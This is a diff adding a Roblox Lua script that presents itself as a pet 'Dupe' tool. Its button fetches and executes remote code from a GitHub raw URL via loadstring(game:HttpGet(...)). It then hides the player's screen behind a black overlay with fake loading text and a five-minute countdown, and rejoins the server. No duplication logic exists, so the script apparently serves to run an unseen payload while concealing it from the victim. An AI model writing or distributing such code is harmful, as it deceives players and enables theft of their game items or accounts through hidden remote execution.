@@ -1,0 +1,175 @@
+-- Prevent double execution
+if _G.YoshidaaHubRunning then return end
+_G.YoshidaaHubRunning = true
+
+-- Services
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local TeleportService = game:GetService("TeleportService")
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "YoshidaaPremiumGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+-- Blur Effect
+local blur = Instance.new("BlurEffect")
+blur.Size = 24
+blur.Parent = Lighting
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 400, 0, 250)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+mainFrame.BackgroundTransparency = 0.2
+mainFrame.Parent = screenGui
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 20)
+
+local glow = Instance.new("UIStroke", mainFrame)
+glow.Thickness = 2
+glow.Color = Color3.fromRGB(160, 80, 255)
+glow.Transparency = 0.1
+
+-- Title
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Text = "Dupe "
+title.TextColor3 = Color3.fromRGB(200, 100, 255)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextSize = 24
+
+-- Footer
+local inspired = Instance.new("TextLabel", mainFrame)
+inspired.Size = UDim2.new(1, -20, 0, 20)
+inspired.Position = UDim2.new(0, 10, 1, -25)
+inspired.Text = "5ive.S-H-A-R-K"
+inspired.TextColor3 = Color3.fromRGB(140, 140, 140)
+inspired.BackgroundTransparency = 1
+inspired.Font = Enum.Font.Gotham
+inspired.TextSize = 14
+inspired.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Activate Button
+local button = Instance.new("TextButton", mainFrame)
+button.Size = UDim2.new(0.85, 0, 0, 44)
+button.Position = UDim2.new(0.075, 0, 0.55, 0)
+button.Text = "Active"
+button.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.Gotham
+button.TextSize = 18
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
+
+local btnStroke = Instance.new("UIStroke", button)
+btnStroke.Thickness = 2
+btnStroke.Color = Color3.fromRGB(255, 100, 255)
+btnStroke.Transparency = 0.3
+
+-- Hover Animation
+button.MouseEnter:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+		Size = UDim2.new(0.9, 0, 0, 50)
+	}):Play()
+	btnStroke.Transparency = 0
+end)
+
+button.MouseLeave:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+		Size = UDim2.new(0.85, 0, 0, 44)
+	}):Play()
+	btnStroke.Transparency = 0.3
+end)
+
+-- Activation Logic
+button.MouseButton1Click:Connect(function()
+	button.Text = "✅ Active..."
+	button.BackgroundColor3 = Color3.fromRGB(60, 0, 100)
+
+	-- Load PetsDuped script
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/GrowaGarden/refs/heads/main/NoLagHub"))()
+
+	-- Black Loading Overlay
+	task.delay(0.01, function()
+		local gui = Instance.new("ScreenGui", CoreGui)
+		gui.Name = "YoshidaaBlackLoading"
+		gui.IgnoreGuiInset = true
+		gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+		local frame = Instance.new("Frame", gui)
+		frame.BackgroundColor3 = Color3.new(0, 0, 0)
+		frame.Size = UDim2.new(1, 0, 1, 36)
+		frame.Position = UDim2.new(0, 0, 0, -36)
+		frame.ZIndex = 999999
+		frame.BackgroundTransparency = 1
+		TweenService:Create(frame, TweenInfo.new(0.5), {
+			BackgroundTransparency = 0
+		}):Play()
+
+		local gradient = Instance.new("UIGradient", frame)
+		gradient.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 0, 60)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 20))
+		})
+		gradient.Rotation = 90
+
+		local msg = Instance.new("TextLabel", frame)
+		msg.Size = UDim2.new(1, 0, 0, 50)
+		msg.Position = UDim2.new(0, 0, 0.45, 0)
+		msg.Text = "🔍 Find Old Id Server..."
+		msg.TextColor3 = Color3.fromRGB(255, 255, 255)
+		msg.BackgroundTransparency = 1
+		msg.Font = Enum.Font.GothamBold
+		msg.TextScaled = true
+		msg.ZIndex = 999999
+
+		local percent = Instance.new("TextLabel", frame)
+		percent.Size = UDim2.new(1, 0, 0, 30)
+		percent.Position = UDim2.new(0, 0, 0.55, 0)
+		percent.Text = "Loading 0%"
+		percent.TextColor3 = Color3.fromRGB(180, 180, 255)
+		percent.BackgroundTransparency = 1
+		percent.Font = Enum.Font.Gotham
+		percent.TextScaled = true
+		percent.ZIndex = 999999
+
+		-- Countdown Logic
+		task.spawn(function()
+			for i = 1, 100 do
+				percent.Text = "Loading " .. i .. "%"
+				task.wait(0.1)
+			end
+
+			percent.Visible = false
+			msg.Text = "🕒 Wait Few Sec Random ID Dupe Pet"
+
+			local countdown = Instance.new("TextLabel", frame)
+			countdown.Size = UDim2.new(1, 0, 0, 40)
+			countdown.Position = UDim2.new(0, 0, 0.63, 0)
+			countdown.TextColor3 = Color3.fromRGB(255, 200, 200)
+			countdown.BackgroundTransparency = 1
+			countdown.Font = Enum.Font.GothamBold
+			countdown.TextScaled = true
+			countdown.ZIndex = 999999
+
+			local totalTime = 300
+			while totalTime >= 0 do
+				countdown.Text = string.format("Rejoin in %02d:%02d", math.floor(totalTime / 60), totalTime % 60)
+				task.wait(1)
+				totalTime = totalTime - 1
+			end
+
+			msg.Text = "AUTO RE-JOIN START"
+			countdown.Text = ""
+			task.wait(2)
+
+			TeleportService:Teleport(game.PlaceId)
+		end)
+	end)
+end)
